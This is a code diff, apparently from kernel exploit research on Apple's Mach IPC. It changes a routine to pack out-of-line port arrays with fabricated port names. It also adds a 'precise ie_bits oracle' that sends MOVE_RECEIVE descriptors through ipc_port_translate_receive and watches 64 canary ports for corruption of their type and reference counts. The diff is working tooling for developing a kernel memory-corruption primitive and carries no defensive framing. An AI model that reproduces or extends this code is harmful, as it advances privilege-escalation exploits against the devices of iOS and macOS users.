@@ -292,9 +292,10 @@
     // so the kernel's copyin never reads past our buffer.
     uint32_t allocEntries = (count > real ? count : real) + 32;
     mach_port_t *ports = calloc(allocEntries, sizeof(mach_port_t));
-    // Fill ALL entries with valid port names (or NULL) to avoid MACH_SEND_INVALID_RIGHT
+    // Fill first 'real' entries with valid ports, rest with INVALID names
+    // (MACH_PORT_NULL is legal in OOL arrays — kernel accepts it without error)
     for (uint32_t i = 0; i < allocEntries; i++) {
-        ports[i] = (i < real) ? sendRight : MACH_PORT_NULL;
+        ports[i] = (i < real) ? sendRight : (mach_port_t)(0xdeadbee0 + i);
     }
 
     uint8_t *buf = calloc(1, total);
@@ -439,7 +440,81 @@
         [report appendFormat:@"First rejected count: %u; inspect send_kr/recv_kr rather than inferring a clamp.\n", threshold];
     }
 
-    // --- translate_receive bit-set canary ---
+    // --- precise ie_bits oracle (mach_port_type + mach_port_get_refs) ---
+    // Per ollie: mach_msg_send is blind to OR-mutations of ie_bits.
+    // Use mach_port_type() + mach_port_get_refs() for exact bit/urefs comparison.
+    // Also use MACH_MSG_TYPE_MOVE_RECEIVE to trigger ipc_port_translate_receive.
+    [report appendString:@"\n--- precise ie_bits oracle (MOVE_RECEIVE) ---\n"];
+
+    #define PRECISE_N 64
+    mach_port_t pcanary[PRECISE_N];
+    mach_port_type_t ptype_before[PRECISE_N];
+    mach_port_urefs_t prefs_before[PRECISE_N];
+
+    for (int i = 0; i < PRECISE_N; i++) {
+        pcanary[i] = MACH_PORT_NULL;
+        mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &pcanary[i]);
+        mach_port_insert_right(mach_task_self(), pcanary[i], pcanary[i], MACH_MSG_TYPE_MAKE_SEND);
+        mach_port_type(mach_task_self(), pcanary[i], &ptype_before[i]);
+        mach_port_get_refs(mach_task_self(), pcanary[i], MACH_PORT_RIGHT_SEND, &prefs_before[i]);
+    }
+
+    // Send message with MOVE_RECEIVE descriptor to trigger ipc_port_translate_receive
+    #pragma pack(push, 4)
+    struct {
+        mach_msg_header_t hdr;
+        mach_msg_body_t body;
+        mach_msg_port_descriptor_t desc[2];
+    } moveMsg;
+    #pragma pack(pop)
+
+    mach_port_t moveRx = MACH_PORT_NULL;
+    mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &moveRx);
+    mach_port_insert_right(mach_task_self(), moveRx, moveRx, MACH_MSG_TYPE_MAKE_SEND);
+
+    memset(&moveMsg, 0, sizeof(moveMsg));
+    moveMsg.hdr.msgh_bits = MACH_MSGH_BITS_COMPLEX | MACH_MSGH_BITS(MACH_MSG_TYPE_COPY_SEND, 0);
+    moveMsg.hdr.msgh_size = sizeof(moveMsg);
+    moveMsg.hdr.msgh_remote_port = port;
+    moveMsg.hdr.msgh_id = 0x112514;
+    moveMsg.body.msgh_descriptor_count = 2;
+    moveMsg.desc[0].name = pcanary[0];
+    moveMsg.desc[0].disposition = MACH_MSG_TYPE_COPY_SEND;
+    moveMsg.desc[0].type = MACH_MSG_PORT_DESCRIPTOR;
+    moveMsg.desc[1].name = moveRx;
+    moveMsg.desc[1].disposition = MACH_MSG_TYPE_MOVE_RECEIVE;
+    moveMsg.desc[1].type = MACH_MSG_PORT_DESCRIPTOR;
+
+    kern_return_t moveSend = mach_msg(&moveMsg.hdr, MACH_SEND_MSG, sizeof(moveMsg), 0,
+                                       MACH_PORT_NULL, 0, MACH_PORT_NULL);
+    [report appendFormat:@"MOVE_RECEIVE send_kr=0x%x\n", (unsigned)moveSend];
+
+    // Receive to trigger translate_receive
+    uint8_t moveRx2[256] = {0};
+    mach_msg_header_t *rxh = (mach_msg_header_t *)moveRx2;
+    kern_return_t moveRecv = mach_msg(rxh, MACH_RCV_MSG | MACH_RCV_TIMEOUT, 0,
+                                       sizeof(moveRx2), port, 50, MACH_PORT_NULL);
+    [report appendFormat:@"MOVE_RECEIVE recv_kr=0x%x\n", (unsigned)moveRecv];
+
+    // Check canaries with precise oracle
+    int mutations = 0;
+    for (int i = 0; i < PRECISE_N; i++) {
+        mach_port_type_t ptype_now = 0;
+        mach_port_urefs_t prefs_now = 0;
+        kern_return_t kr1 = mach_port_type(mach_task_self(), pcanary[i], &ptype_now);
+        kern_return_t kr2 = mach_port_get_refs(mach_task_self(), pcanary[i], MACH_PORT_RIGHT_SEND, &prefs_now);
+        if (kr1 != KERN_SUCCESS || kr2 != KERN_SUCCESS ||
+            ptype_now != ptype_before[i] || prefs_now != prefs_before[i]) {
+            [report appendFormat:@"  MUTATION canary[%d] port=0x%x (idx=%u): type 0x%x->0x%x, srefs %u->%u\n",
+             i, pcanary[i], pcanary[i] >> 8,
+             ptype_before[i], ptype_now, prefs_before[i], prefs_now];
+            mutations++;
+        }
+    }
+    [report appendFormat:@"ie_bits mutations: %d/%d\n", mutations, PRECISE_N];
+
+    for (int i = 0; i < PRECISE_N; i++) mach_port_destroy(mach_task_self(), pcanary[i]);
+    mach_port_destroy(mach_task_self(), moveRx);
     // Allocate 128 canary ports. Snapshot their urefs. Trigger translate_receive
     // with various w2 values (OOL counts). Snapshot again. Any delta = bit-set hit.
     [report appendString:@"\n--- translate_receive bit-set canary (128 ports) ---\n"];
